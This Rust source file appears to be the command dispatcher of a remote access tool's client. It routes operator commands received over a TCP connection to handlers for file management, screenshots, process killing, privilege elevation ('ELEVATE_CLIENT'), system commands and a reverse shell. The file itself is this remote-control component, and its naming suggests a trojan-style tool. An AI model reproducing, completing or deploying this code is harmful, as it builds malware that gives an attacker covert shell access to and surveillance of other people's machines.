use std::sync::{ Arc, Mutex };
use std::net::TcpStream;
use std::path::PathBuf;
use std::process::Child;

use crate::features::file_manager::file_manager;
use crate::features::system_commands::system_commands;
use crate::features::other::{ take_screenshot, client_info, visit_website, elevate_client };
use crate::features::process::{ process_list, kill_process };

pub fn handle_command(
    write_stream: &mut TcpStream,
    command: &str,
    command_data: &str,
    path: &str,
    current_path: &mut PathBuf,
    secret: &Option<Vec<u8>>
) {
    let mut reverse_shell_lock = crate::REVERSE_SHELL.lock().unwrap();

    match command {
        "FILE_MANAGER" => file_manager(write_stream, current_path, command_data, path, &secret),
        "VISIT_WEBSITE" => visit_website(write_stream, command_data, path, &secret),
        "ELEVATE_CLIENT" => elevate_client(),
        // _ if command.starts_with("encryption_request") => encryption_request(write_stream, &command["encryption_request::".len()..]),
        "INIT_CLIENT" => client_info(write_stream, &secret),
        "SCREENSHOT" =>
            take_screenshot(write_stream, command_data.parse::<i32>().unwrap(), &secret),
        "PROCESS_LIST" => process_list(write_stream, &secret),
        "KILL_PROCESS" => kill_process(command_data.parse::<usize>().unwrap()),
        "START_SHELL" =>
            reverse_shell_lock.start_shell(
                Arc::new(Mutex::new(write_stream.try_clone().expect("Failed to clone TcpStream"))),
                secret
            ),
        "EXIT_SHELL" => reverse_shell_lock.exit_shell(),
        "SHELL_COMMAND" => reverse_shell_lock.execute_shell_command(command_data),
        "MANAGE_SYSTEM" => system_commands(command_data),
        _ => {}
    }
}
